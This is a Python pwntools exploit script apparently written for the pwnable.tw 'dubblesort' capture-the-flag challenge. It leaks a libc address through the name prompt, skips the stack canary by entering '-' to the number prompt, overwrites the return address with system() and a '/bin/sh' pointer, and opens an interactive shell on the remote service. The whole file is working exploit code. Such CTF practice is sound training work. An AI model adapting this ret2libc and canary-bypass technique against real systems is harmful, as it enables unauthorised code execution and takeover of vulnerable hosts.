
from pwn import *
import pdb
import re

# context.log_level = 'debug'


def getLibc():
  payload = 'a'*(4*7-1)
  print(payload)
  p.sendlineafter('What your name :', payload)
  p.recvuntil('Hello {}'.format(payload+chr(10)))

  v = p.recv(4)
  return u32(v)

p = remote('chall.pwnable.tw', 10101)
# p = process('/home/len/pwnable/dubblesort')

count = 35

libc_src = './libc_32.so.6'

libc_addr = None
libc_off = 0x1ae244
system_off = 0x3A940 
bin_off = 0x158E8B

flag = 1

if __name__ == "__main__":
  libc_addr = getLibc() - libc_off

  system_addr = libc_addr + system_off
  bin_addr = libc_addr + bin_off

  print('libc_addr: {:#x}'.format(libc_addr))
  print('system_addr: {:#x}'.format(system_addr))
  print('bin_addr: {:#x}'.format(bin_addr))

  p.sendlineafter('sort :', str(count))
  for i in range(24):
    p.sendlineafter('number : ', str(flag))
  
  p.sendlineafter('number : ', '-')

  # canary's gas isnot always 0x20
  for i in range(8):
    p.sendlineafter('number : ', str(system_addr))
  
  p.sendlineafter('number : ', str(bin_addr))
  p.sendlineafter('number : ', str(bin_addr))
  
  p.interactive()
  p.close()
